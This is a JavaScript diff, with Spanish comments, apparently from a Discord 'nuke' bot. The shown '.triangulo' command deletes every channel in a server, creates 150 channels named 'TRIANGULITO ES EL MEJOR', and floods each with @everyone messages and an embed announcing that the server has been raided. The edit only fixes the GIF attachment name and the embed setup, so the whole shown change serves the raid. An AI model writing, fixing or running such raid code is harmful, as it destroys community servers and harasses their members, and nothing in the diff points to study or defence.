@@ -174,16 +174,26 @@ else if (cmd.startsWith('.diversión')) {
     } catch (e) {}
   }
 
-  else if (cmd === '.triangulo') {
+else if (cmd === '.triangulo') {
     if (!guild) return;
-    // 1. Delete + Create in parallel batches
+
+    // 1. Asegúrate de que el nombre del archivo coincida con su formato real (.gif)
+    const gifFile = new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' });
+
+    // 2. Ajusta el embed para que apunte al nuevo nombre del archivo
+    const trianguloEmbed = new EmbedBuilder()
+      .setColor(0xFF0000)
+      .setDescription('TRIANGULITO ES EL MEJOR, HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO')
+      .setImage('attachment://triangulo.gif'); // Nombre debe coincidir con el de arriba
+
     await deleteAllChannels(guild);
     const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
-    // 2. Spam all 10 messages per channel fully in parallel
+    
+    // 3. Pasa el archivo correctamente al spam
     await spamChannels(created, 10, () => ({
       content: '@everyone',
       embeds: [trianguloEmbed],
-      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulito.webp' })]
+      files: [gifFile] // Usamos la variable definida arriba
     }));
   }
 
